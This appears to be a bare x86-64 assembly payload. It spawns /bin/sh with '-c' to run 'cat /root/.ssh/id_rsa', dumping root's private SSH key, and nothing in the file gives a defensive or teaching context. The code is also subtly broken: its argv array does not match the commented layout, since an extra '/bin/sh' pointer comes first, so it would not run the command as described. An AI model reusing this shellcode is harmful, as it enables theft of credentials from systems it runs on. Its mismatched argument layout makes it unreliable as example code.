source:
global _start
section .text
_start:
    ; execve('/bin/sh', ['sh','-c',cmd,0], 0)
    mov rax, 59
    lea rdi, [rel sh]
    lea rsi, [rel argv]
    xor rdx, rdx
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall

section .data
sh db '/bin/sh', 0
arg0 db 'sh', 0
arg1 db '-c', 0
cmd db 'cat /root/.ssh/id_rsa', 0
align 8
argv dq sh, arg0, arg1, cmd, 0
